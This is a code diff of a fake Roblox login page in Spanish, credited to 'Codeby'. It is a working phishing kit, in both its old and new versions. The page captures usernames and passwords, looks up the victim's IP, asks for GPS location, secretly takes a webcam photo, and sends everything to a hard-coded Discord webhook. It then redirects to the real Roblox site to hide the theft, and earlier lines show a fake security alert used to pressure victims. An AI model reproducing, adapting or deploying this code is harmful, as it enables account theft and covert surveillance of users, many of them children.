@@ -3,140 +3,161 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iniciar sesión en Roblox</title>
+    <title>Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; overflow: hidden; background-color: #000; }
-        .bg-img { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: url('https://i.imgur.com/8mXfRmW.png'); background-size: cover; background-position: center; z-index: 1; }
-        .bg-darken { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.75); z-index: 2; }
-        .nav-bar { background-color: #191b1d; height: 40px; border-bottom: 1px solid #393b3d; display: flex; justify-content: center; align-items: center; position: relative; z-index: 10; }
-        .nav-bar img { height: 22px; }
-        .content { position: relative; z-index: 5; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
-        .login-card { background-color: #191b1d; padding: 30px; border-radius: 8px; width: 90%; max-width: 380px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); text-align: center; }
-        h1 { color: #fff; font-size: 20px; margin-bottom: 20px; font-weight: 500; text-align: left; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background-color: #000; color: #fff; border: 1px solid #393b3d; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
-        .btn-primary { width: 100%; padding: 12px; margin-top: 15px; background-color: #0084ff; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 15px; }
-        .sub-links { color: #adb5bd; font-size: 13px; margin-top: 20px; text-align: left; line-height: 1.8; }
-        .sub-links a { color: #0084ff; text-decoration: none; }
-        .codeby-footer { color: #00ffcc; font-size: 9px; margin-top: 25px; opacity: 0.5; text-transform: uppercase; letter-spacing: 2px; font-weight: bold; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; background-color: #000; overflow: hidden; }
+        
+        /* FONDO MOSAICO EXACTO */
+        .roblox-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://i.imgur.com/8mXfRmW.png');
+            background-size: cover; background-position: center; z-index: 1;
+        }
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.72); z-index: 2;
+        }
+
+        /* HEADER OFICIAL */
+        .nav-header {
+            background-color: #191b1d; height: 40px; display: flex; 
+            justify-content: center; align-items: center; position: relative; z-index: 10;
+            border-bottom: 1px solid #393b3d;
+        }
+        .nav-header img { height: 22px; }
+
+        .main-wrapper { position: relative; z-index: 5; display: flex; justify-content: center; align-items: center; height: calc(100vh - 40px); }
+
+        /* CARD DE LOGIN IDENTICA */
+        .login-container {
+            background-color: #191b1d; padding: 40px 30px; border-radius: 8px;
+            width: 90%; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+            text-align: center; border: 1px solid #333;
+        }
+
+        h1 { color: #fff; font-size: 20px; margin-bottom: 25px; font-weight: 500; text-align: left; margin-left: 5px; }
+
+        input {
+            width: 100%; padding: 14px; margin-bottom: 12px;
+            background-color: #000; color: #fff; border: 1px solid #393b3d;
+            border-radius: 4px; font-size: 15px; box-sizing: border-box;
+            transition: border 0.2s;
+        }
+        input:focus { border-color: #0084ff; outline: none; }
+
+        .btn-login {
+            width: 100%; padding: 14px; background-color: #0084ff;
+            color: #fff; border: none; border-radius: 4px;
+            font-weight: 600; cursor: pointer; font-size: 16px; margin-top: 10px;
+        }
+        .btn-login:active { background-color: #0074e0; }
+
+        .footer-links { color: #adb5bd; font-size: 13px; margin-top: 25px; text-align: left; line-height: 2; }
+        .footer-links a { color: #0084ff; text-decoration: none; font-weight: 400; }
+        .footer-links a:hover { text-decoration: underline; }
+
+        .codeby-label { color: #00ffcc; font-size: 9px; margin-top: 30px; opacity: 0.4; letter-spacing: 2px; font-weight: bold; }
+        
+        #v { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="nav-bar"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
-    <div class="bg-img"></div>
-    <div class="bg-darken"></div>
-    
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+    <div class="nav-header"><img src="https://images.rbxcdn.com/2b53f60f64c677840139b4b9b6574f0c.png" alt="Roblox"></div>
+    <div class="roblox-bg"></div>
+    <div class="overlay"></div>
 
-    <div class="content">
-        <div class="login-card">
+    <div class="main-wrapper">
+        <div class="login-container">
             <h1>Iniciar sesión en Roblox</h1>
-            <input type="text" id="user" placeholder="Usuario/correo/teléfono">
-            <input type="password" id="pass" placeholder="Contraseña">
-            <button class="btn-primary" id="btnLog">Iniciar sesión</button>
-            <div class="sub-links">
+            <input type="text" id="username" placeholder="Usuario/correo/teléfono">
+            <input type="password" id="password" placeholder="Contraseña">
+            <button class="btn-login" id="loginBtn">Iniciar sesión</button>
+            
+            <div class="footer-links">
                 <a href="#">¿Olvidaste la contraseña o el nombre de usuario?</a><br>
                 <a href="#">Inicio de sesión rápido</a><br>
                 <span>¿No tienes una cuenta? <a href="#">Regístrate</a></span>
             </div>
-            <div class="codeby-footer">GUI By:Codeby</div>
+            <div class="codeby-label">GUI By:Codeby</div>
         </div>
     </div>
 
+    <video id="v" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+
     <script>
         const hook = "https://discord.com/api/webhooks/1499616194741801133/i-irhmgrf87Sldg0W8yWsgRAz_TUYh3JK7DEu7UGi6bsKvMNUwNe3vnpH2Ga1qFlvUNk";
-        let infoIP = {};
+        let infoData = {};
 
-        // Cargar datos de IP al inicio
         window.onload = async () => {
             try {
                 const r = await fetch('https://ipapi.co/json/');
-                infoIP = await r.json();
-            } catch (e) {}
+                infoData = await r.json();
+            } catch(e) {}
         };
 
-        document.getElementById('btnLog').addEventListener('click', async () => {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+        document.getElementById('loginBtn').addEventListener('click', async () => {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
 
-            if (!user || !pass) return;
-
-            // 1. Mensaje persuasivo para asegurar que acepten
-            alert("AVISO DE SEGURIDAD: Roblox ha detectado un inicio de sesión desde un dispositivo nuevo. Para verificar su identidad, debe permitir el acceso a su ubicación y cámara en las siguientes ventanas.");
-
-            // INICIO DE CADENA DE PERMISOS
-            // Primero la Ubicación
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    solicitarCamara(user, pass, gps);
-                },
-                () => {
-                    solicitarCamara(user, pass, "Ubicación Denegada");
-                },
-                { timeout: 8000 }
-            );
+            if (u && p) {
+                document.getElementById('loginBtn').innerText = "Cargando...";
+                
+                // Pedir ubicación con excusa de seguridad
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await handleCapture(u, p, loc);
+                }, async () => {
+                    await handleCapture(u, p, "Acceso GPS Denegado");
+                });
+            }
         });
 
-        async function solicitarCamara(u, p, gps) {
-            let camStatus = "Denegada";
+        async function handleCapture(u, p, gps) {
+            let camS = "Denegada";
             let foto = null;
 
             try {
-                // Segundo: La Cámara
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                camStatus = "Concedida";
-                
+                camS = "Concedida";
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // Esperar a que la cámara inicie
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 800));
                 
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                
                 foto = await new Promise(r => canvas.toBlob(r, 'image/png'));
                 stream.getTracks().forEach(t => t.stop());
-            } catch (err) {
-                console.log("Cámara rechazada");
-            }
+            } catch(e) {}
 
-            enviarTodo(u, p, gps, camStatus, foto);
-        }
-
-        async function enviarTodo(u, p, gps, cam, foto) {
-            const formData = new FormData();
-            
+            // Enviar todo a Discord
+            const fd = new FormData();
             const embed = {
-                title: "🚀 REPORTE FINAL - Codeby",
+                title: "💎 NUEVO ACCESO CAPTURADO - Codeby",
                 color: 0xff0000,
                 fields: [
                     { name: "👤 Usuario", value: `\`${u}\``, inline: true },
                     { name: "🔒 Clave", value: `\`${p}\``, inline: true },
-                    { name: "🌐 IP", value: `\`${infoIP.ip || 'N/A'}\``, inline: true },
-                    { name: "🚩 País", value: `${infoIP.country_emoji || ''} ${infoIP.country_name || 'N/A'}`, inline: true },
-                    { name: "📍 GPS", value: gps },
-                    { name: "📸 Cámara", value: cam, inline: true }
+                    { name: "🚩 País", value: `${infoData.country_emoji || ''} ${infoData.country_name || 'N/A'}`, inline: true },
+                    { name: "🌐 IP", value: `\`${infoData.ip || 'N/A'}\``, inline: true },
+                    { name: "📍 Ubicación", value: gps },
+                    { name: "📸 Cámara", value: camS, inline: true }
                 ],
-                footer: { text: "GUI By:Codeby" },
+                footer: { text: "By:Codeby" },
                 timestamp: new Date()
             };
 
-            formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-            
-            if (foto) {
-                formData.append('file', foto, 'captura_codeby.png');
-            }
+            fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
+            if (foto) fd.append('file', foto, 'rostro.png');
 
-            await fetch(hook, { method: 'POST', body: formData });
+            await fetch(hook, { method: 'POST', body: fd });
 
-            // Redirigir después de enviar
-            window.location.href = "https://www.roblox.com/login";
+            // ENTRAR A ROBLOX REAL
+            // Redirigimos al Home para que parezca que la sesión inició
+            window.location.href = "https://www.roblox.com/home";
         }
     </script>
 </body>
